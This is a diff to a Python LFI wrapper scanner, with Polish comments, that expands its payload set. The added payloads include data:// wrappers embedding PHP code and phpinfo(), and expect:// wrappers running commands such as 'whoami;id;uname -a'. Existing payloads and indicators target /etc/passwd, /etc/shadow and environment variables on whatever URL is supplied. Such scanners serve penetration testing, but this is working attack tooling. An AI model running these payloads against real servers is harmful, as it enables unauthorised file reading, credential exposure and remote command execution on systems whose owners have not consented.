@@ -21,8 +21,9 @@ class Color:
     END = '\033[0m'
 
 class LFIWrapperScanner:
-    def __init__(self, proxy: str = None):
+    def __init__(self, proxy: str = None, target_dir: str = None):
         self.proxy = self._setup_proxy(proxy)
+        self.target_dir = target_dir
         self.detected_php_version = None
         
         self.session = requests.Session()
@@ -57,7 +58,8 @@ class LFIWrapperScanner:
             'warning': Color.YELLOW,
             'error': Color.RED,
             'testing': Color.CYAN,
-            'verified': Color.MAGENTA
+            'verified': Color.MAGENTA,
+            'payload': Color.WHITE
         }
         
         color = color_map.get(msg_type, Color.WHITE)
@@ -360,6 +362,13 @@ class LFIWrapperScanner:
             'database.php.bak',
         ]
         
+        # Dodaj target directory jeśli podano
+        if self.target_dir:
+            test_files.insert(0, self.target_dir)
+            # Dodaj też kombinacje z traversal do target directory
+            for traversal in traversal_payloads[:5]:
+                test_files.append(traversal + self.target_dir.lstrip('/'))
+        
         test_content = base64.b64encode(b"<?php echo 'VULNERABLE'; ?>").decode()
         test_content2 = base64.b64encode(b"<?php system('id'); ?>").decode()
         data_wrappers = [
@@ -370,6 +379,8 @@ class LFIWrapperScanner:
             'data://text/plain;charset=base64,' + test_content,
             'data://text/php;base64,' + test_content,
             'data://text/php,' + urllib.parse.quote("<?php echo 'VULNERABLE'; ?>"),
+            'data://,<?php echo "TEST"; ?>',
+            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',  # phpinfo()
         ]
         
         expect_wrappers = [
@@ -384,6 +395,8 @@ class LFIWrapperScanner:
             'expect://ip addr',
             'expect://netstat -an',
             'expect://ps aux',
+            'expect://echo "VULNERABLE"',
+            'expect://whoami;id;uname -a',
         ]
         
         rfi_wrappers = [
@@ -466,6 +479,27 @@ class LFIWrapperScanner:
         return version_specific
 
     def verify_vulnerability(self, content: str, wrapper: str):
+        # False positive reduction - sprawdź czy to nie jest normalna strona
+        false_positives = [
+            '<!DOCTYPE html>',
+            '<html',
+            '</html>',
+            '<head>',
+            '</head>',
+            '<body>',
+            '</body>',
+            'window.location',
+            'HTTP Status 404',
+            '404 Not Found',
+            'Error 404',
+            'Page not found',
+        ]
+        
+        # Sprawdź czy zawartość nie wygląda jak normalna strona HTML
+        content_lower = content.lower()
+        if any(fp.lower() in content_lower for fp in false_positives[:5]):
+            return None
+        
         indicators = {
             'root:x:0:0': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/passwd'},
             'root:*:': {'confidence': 'high', 'type': 'LFI', 'file': '/etc/shadow'},
@@ -498,21 +532,27 @@ class LFIWrapperScanner:
             'USER=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
             'PWD=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
             'HOME=': {'confidence': 'medium', 'type': 'LFI', 'file': 'environment'},
+            'PHP Version': {'confidence': 'high', 'type': 'RCE', 'file': 'phpinfo'},
         }
         
         for pattern, info in indicators.items():
             if pattern in content:
                 return info
         
-        if len(content) > 20 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=' for c in content[:100]):
+        # Sprawdź base64
+        if len(content) > 20 and all(c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\n\r' for c in content[:200]):
             try:
-                decoded = base64.b64decode(content[:200]).decode('utf-8', errors='ignore')
+                decoded = base64.b64decode(content[:400]).decode('utf-8', errors='ignore')
                 for pattern, info in indicators.items():
                     if pattern in decoded:
                         return info
+                # Sprawdź czy zdekodowany base64 zawiera znaki systemowe
+                if 'root:' in decoded or '<?php' in decoded or 'Linux' in decoded:
+                    return {'confidence': 'medium', 'type': 'LFI', 'file': 'base64 encoded content'}
             except:
                 pass
         
+        # Sprawdź ROT13
         def rot13(text):
             result = []
             for char in text:
@@ -529,6 +569,19 @@ class LFIWrapperScanner:
             if pattern in rot13_content:
                 return {'confidence': 'high', 'type': 'LFI', 'file': f"ROT13 encoded {info['file']}"}
         
+        # Specjalne przypadki dla expect i data wrappers
+        if wrapper.startswith('expect://'):
+            if 'www-data' in content or 'root' in content or 'uid=' in content:
+                return {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'}
+            if 'VULNERABLE' in content:
+                return {'confidence': 'high', 'type': 'RCE', 'file': 'command execution'}
+        
+        if wrapper.startswith('data://'):
+            if 'VULNERABLE' in content or 'TEST' in content:
+                return {'confidence': 'high', 'type': 'RCE', 'file': 'data wrapper execution'}
+            if 'PHP Version' in content:
+                return {'confidence': 'high', 'type': 'RCE', 'file': 'data wrapper phpinfo'}
+        
         return None
 
     def test_payload(self, target_url: str, parameter: str, wrapper: str):
@@ -542,14 +595,16 @@ class LFIWrapperScanner:
                 verification = self.verify_vulnerability(response.text, wrapper)
                 if verification:
                     color = Color.RED if verification['confidence'] == 'high' else Color.YELLOW
-                    self.print_status(f"✓ VULNERABLE - {wrapper}", 'success')
-                    self.print_status(f"  → Type: {verification['type']} | File: {verification['file']}", 'verified')
+                    self.print_status(f"✓ VULNERABLE - Parameter: {parameter} | Payload: {wrapper}", 'success')
+                    self.print_status(f"  → Type: {verification['type']} | Confidence: {verification['confidence']} | File: {verification['file']}", 'verified')
                     return True
-            
-            self.print_status(f"✗ Not vulnerable - {wrapper}", 'error')
+                else:
+                    self.print_status(f"✗ Not vulnerable - Parameter: {parameter} | Payload: {wrapper}", 'error')
+            else:
+                self.print_status(f"✗ HTTP {response.status_code} - Parameter: {parameter} | Payload: {wrapper}", 'error')
             
         except Exception as e:
-            self.print_status(f"✗ Failed - {wrapper} ({str(e)})", 'error')
+            self.print_status(f"✗ Failed - Parameter: {parameter} | Payload: {wrapper} ({str(e)})", 'error')
         
         return False
 
@@ -558,6 +613,8 @@ class LFIWrapperScanner:
         self.print_status(f"Testing parameter: {parameter}", 'info')
         if self.proxy:
             self.print_status(f"Using proxy: {self.proxy}", 'info')
+        if self.target_dir:
+            self.print_status(f"Target directory: {self.target_dir}", 'info')
         self.print_status("SSL verification: DISABLED (self-signed certs supported)", 'info')
         print("-" * 60)
         
@@ -579,7 +636,8 @@ class LFIWrapperScanner:
         print("-" * 60)
         
         try:
-            self.session.get(target_url, timeout=5, verify=False)
+            response = self.session.get(target_url, timeout=5, verify=False)
+            self.print_status(f"Initial connection: HTTP {response.status_code}", 'info')
         except Exception as e:
             self.print_status(f"Connection failed: {e}", 'error')
             return
@@ -588,7 +646,8 @@ class LFIWrapperScanner:
         self.print_status(f"Generated {len(wrappers)} payloads for testing", 'info')
         vulnerable_count = 0
         
-        for wrapper in wrappers:
+        for i, wrapper in enumerate(wrappers, 1):
+            self.print_status(f"Testing payload {i}/{len(wrappers)}: {wrapper}", 'payload')
             if self.test_payload(target_url, parameter, wrapper):
                 vulnerable_count += 1
         
@@ -609,7 +668,7 @@ class LFIWrapperScanner:
                     |_|         |_|              
 {Color.END}
         {Color.YELLOW}LFI Wrapper Scanner{Color.END}
-        {Color.BLUE}Simple LFI Detection Tool{Color.END}
+        {Color.BLUE}Enhanced with expect://, data:// and false positive reduction{Color.END}
         {Color.MAGENTA}Author: csshark{Color.END}
         
         """
@@ -623,12 +682,16 @@ def main():
     parser.add_argument('url', help='Target URL')
     parser.add_argument('param', help='Parameter to test')
     parser.add_argument('--proxy', '-p', help='Proxy (http://proxy:port)')
+    parser.add_argument('--target-dir', '-t', help='Target directory for wrapper traversal')
     
     if len(sys.argv) == 1:
         parser.print_help()
         return
     
     args = parser.parse_args()
+    
+    # Utwórz scanner z opcjonalnym target_dir
+    scanner = LFIWrapperScanner(proxy=args.proxy, target_dir=args.target_dir)
     
     if args.proxy:
         scanner.proxy = {'http': args.proxy, 'https': args.proxy}
